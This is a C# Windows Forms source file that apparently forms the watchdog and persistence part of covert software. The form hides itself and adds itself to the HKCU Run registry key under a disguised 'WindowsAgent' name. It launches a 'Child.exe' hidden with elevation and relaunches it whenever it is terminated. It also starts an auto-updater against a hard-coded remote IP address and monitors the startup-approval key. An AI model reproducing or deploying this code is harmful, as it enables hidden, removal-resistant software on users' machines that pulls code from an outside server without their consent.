using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Diagnostics;
using Microsoft.Win32;
using System.Security.Principal;

namespace SpareWF
{
    public partial class Form1 : Form
    {
        public static  ManagementEventWatcher StartWatcher;// the wathcer that looking for process that started and call function;
        public static  ManagementEventWatcher StopWatcher;// the wathcer that looking for process that stoped and call function;
        string DisableOrEnablePath;
        protected ManagementEventWatcher SturtupDisableOrEnable;
        public AutoUpdateClass Updater;
        string IP = "178.32.129.19";

        public Form1()
        {
            InitializeComponent();
            

            this.Visible = false;
            this.Size = new Size(0, 0);
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Hide();
            RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            add.SetValue("WindowsAgentSpare", "\"" + Application.ExecutablePath.ToString() + "\"");
            try
            {
                string Data = add.GetValue("WindowsAgent").ToString();
            }
            catch(Exception e)
            {
                add.SetValue("WindowsAgent", "\"" + Application.StartupPath.ToString() + "\\" + "Child.exe" + "\"");
                ProcessStartInfo StartInfo = new ProcessStartInfo(Application.StartupPath.ToString() + "\\" + "Child.exe" );
                StartInfo.UseShellExecute = true;
                StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                StartInfo.Verb = "runas";
                Process process = new Process();
                process.StartInfo = StartInfo;
                process.Start();
            }
            StartWatcher = new ManagementEventWatcher();
            StopWatcher = new ManagementEventWatcher();
            Updater = new AutoUpdateClass();
            SturtupDisableOrEnable = new ManagementEventWatcher();
            WqlEventQuery StartQuery = new WqlEventQuery("__InstanceCreationEvent", new TimeSpan(0, 0, 1), "TargetInstance isa \"Win32_Process\"");
            WqlEventQuery StopQuery = new WqlEventQuery("__InstanceDeletionEvent", new TimeSpan(0, 0, 1), "TargetInstance isa \"Win32_Process\"");
            StartWatcher.Query = StartQuery;
            StopWatcher.Query = StopQuery;
            StartWatcher.EventArrived += StartWatcher_EventArrived;
            StopWatcher.EventArrived += StopWatcher_EventArrived;
            StartWatcher.Start();
            StopWatcher.Start();
            Updater.Start(IP, 89898, "v1.0.0", "Child", Process.GetCurrentProcess().MainModule.FileName);
            //SetEventOnSturtupDiaableOrEnable(EnableOrDisable);
        }

        private void EnableOrDisable(object sender, EventArrivedEventArgs e)
        {
            throw new NotImplementedException();
        }

        private void StopWatcher_EventArrived(object sender, EventArrivedEventArgs e)
        {
            string TerminatedProccessName = ((ManagementBaseObject)e.NewEvent
                ["TargetInstance"])["Name"].ToString();
            string TerminatedProccessPath = ((ManagementBaseObject)e.NewEvent
                ["TargetInstance"])["ExecutablePath"].ToString();
            string TerminatedProccessID = ((ManagementBaseObject)e.NewEvent
                ["TargetInstance"])["ProcessId"].ToString();
            if ((TerminatedProccessName.Contains("Child") == true) )
            {
                ProcessStartInfo StartInfo = new ProcessStartInfo(TerminatedProccessPath);
                StartInfo.UseShellExecute = true;
                StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                StartInfo.Verb = "runas";
                Process process = new Process();
                process.StartInfo = StartInfo;
                process.Start();
            }
            
        }

        private void StartWatcher_EventArrived(object sender, EventArrivedEventArgs e)
        {
            
        }
        public void SetEventOnSturtupDiaableOrEnable(EventArrivedEventHandler Handler)
        {
            string keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";
            DisableOrEnablePath = keyPath;
            var currentUser = WindowsIdentity.GetCurrent();
            var query = new WqlEventQuery(string.Format(
            "SELECT * FROM RegistryKeyChangeEvent WHERE Hive='HKEY_USERS' AND KeyPath='{0}\\\\{1}'",
            currentUser.User.Value, keyPath.Replace("\\", "\\\\")));
            SturtupDisableOrEnable = new ManagementEventWatcher(query);
            SturtupDisableOrEnable.EventArrived += Handler;
            SturtupDisableOrEnable.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Conne
        }
    }
}
